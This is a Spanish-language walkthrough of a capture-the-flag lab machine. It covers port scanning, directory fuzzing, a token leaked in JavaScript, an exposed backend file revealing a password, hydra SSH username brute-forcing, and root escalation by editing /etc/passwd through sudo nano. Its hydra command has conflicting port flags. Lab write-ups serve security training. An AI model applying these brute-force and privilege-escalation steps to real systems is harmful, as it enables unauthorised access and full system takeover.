## 1. Reconocimiento Inicial de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos, sus versiones y el sistema operativo. Esto nos ayuda a entender qué servicios están expuestos y si hay alguna vulnerabilidad conocida asociada a sus versiones.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `80/tcp open http Apache httpd 2.4.61`: El puerto 80 está abierto y ejecuta un servidor web Apache.
*   `3000/tcp open http Node.js Express framework`: El puerto 3000 está abierto y ejecuta una aplicación Node.js Express. Esto es interesante, ya que las aplicaciones web a menudo contienen vulnerabilidades.
*   `5000/tcp open ssh OpenSSH 9.2p1 Debian`: El puerto 5000 está abierto y ejecuta OpenSSH. Es importante notar que el puerto SSH no es el estándar (22), lo que podría indicar una configuración personalizada.

## 2. Enumeración Web y Descubrimiento de Información Sensible

La presencia de un servidor web Apache y una aplicación Node.js en el puerto 3000 sugiere que la enumeración web será crucial.

### 2.1. Inspección de la Página Web (Puerto 80)

Al visitar la página web en el puerto 80 (`http://<IP_DEL_OBJETIVO>`), encontramos un botón que no funciona. Esto es una pista para inspeccionar el código fuente de la página.

### 2.2. Análisis del Código Fuente y Archivo JavaScript

Al inspeccionar el código fuente de la página web, encontramos un enlace a un archivo JavaScript: `http://<IP_DEL_OBJETIVO>/authentication.js`. Accedemos a este archivo y encontramos una función `autenticate()` que contiene un mensaje en la consola:

```javascript
function autenticate() {
    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
}
```

Este mensaje nos indica que hay un endpoint `/recurso/` que requiere un token de autenticación, y nos proporciona el token: `tokentraviesito`.

### 2.3. Fuzzing Web (Gobuster)

Aunque ya tenemos una pista importante, realizar un fuzzing de directorios con `gobuster` es una buena práctica para descubrir otras rutas o archivos ocultos en el servidor web.

```bash
gobuster dir -u http://<IP_DEL_OBJETIVO>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

**Resultados Relevantes:**

*   `/backend` (Status: 301) [--> `http://<IP_DEL_OBJETIVO>/backend/`]: Este directorio es redirigido, lo que indica que contiene contenido.

Al explorar `http://<IP_DEL_OBJETIVO>/backend/`, encontramos una lista de archivos, incluyendo `server.js`.

## 3. Análisis del Código del Servidor (server.js)

El archivo `server.js` es el código fuente de la aplicación Node.js Express. Analizarlo nos dará una comprensión más profunda de cómo funciona la aplicación y cómo podemos explotarla.

### 3.1. Contenido de `server.js`

```javascript
const express = require(\'express\');
const app = express();

const port = 3000;

app.use(express.json());

app.post(\'/recurso/\', (req, res) => {
    const token = req.body.token;
    if (token === \'tokentraviesito\') {
        res.send(\'lapassworddebackupmaschingonadetodas\');
    } else {
        res.status(401).send(\'Unauthorized\');
    }
});

app.listen(port, \'0.0.0.0\', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});
```

**Análisis del Código:**

*   La aplicación escucha en el puerto 3000.
*   Define una ruta POST `/recurso/`.
*   Verifica si el `token` enviado en el cuerpo de la solicitud (`req.body.token`) es igual a `tokentraviesito`.
*   Si el token es correcto, envía como respuesta la cadena `lapassworddebackupmaschingonadetodas`.

¡Hemos encontrado la contraseña! La contraseña es `lapassworddebackupmaschingonadetodas`.

## 4. Acceso Inicial (SSH)

Ahora que tenemos una contraseña, necesitamos un nombre de usuario para intentar acceder vía SSH (puerto 5000).

### 4.1. Fuerza Bruta SSH para Obtener el Usuario

Utilizamos `hydra` para realizar un ataque de fuerza bruta, pero esta vez, con la contraseña que ya conocemos, intentaremos adivinar el nombre de usuario. Usaremos un diccionario de nombres de usuario comunes.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://<IP_DEL_OBJETIVO>:5000 -s 22 -t 64
```

**Resultado Clave:**

```bash
[5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas
```

Esto nos proporciona el nombre de usuario: `lovely`.

### 4.2. Conexión SSH

Con las credenciales obtenidas (`lovely:lapassworddebackupmaschingonadetodas`), nos conectamos al servidor SSH.

```bash
ssh -p 5000 lovely@<IP_DEL_OBJETIVO>
# Contraseña: lapassworddebackupmaschingonadetodas
```

## 5. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `lovely`, el objetivo es escalar privilegios a `root`.

### 5.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario `lovely` con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `(ALL) NOPASSWD: /usr/bin/nano`

Esto significa que el usuario `lovely` puede ejecutar el editor de texto `nano` como cualquier usuario (incluido `root`) sin necesidad de introducir su contraseña.

### 5.2. Manipulación de `/etc/passwd` para Obtener Root

El archivo `/etc/passwd` contiene información sobre los usuarios del sistema. La segunda columna de cada entrada (separada por dos puntos `:`) suele contener una `x` si la contraseña está almacenada en `/etc/shadow`. Si eliminamos la `x` para el usuario `root`, podemos iniciar sesión como `root` sin contraseña.

1.  **Editar `/etc/passwd` con `nano` como `root`:**

    ```bash
sudo -u root /usr/bin/nano /etc/passwd
    ```

    Dentro de `nano`, busca la línea que comienza con `root:` y elimina la `x` después del primer dos puntos. La línea debería cambiar de `root:x:0:0:root:/root:/bin/bash` a `root::0:0:root:/root:/bin/bash`.

2.  **Guardar y Salir:** Guarda los cambios (Ctrl+O, Enter) y sal de `nano` (Ctrl+X).

3.  **Cambiar a `root`:** Ahora, puedes usar el comando `su root` (o simplemente `su`) y no te pedirá contraseña.

    ```bash
su root
    ```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```

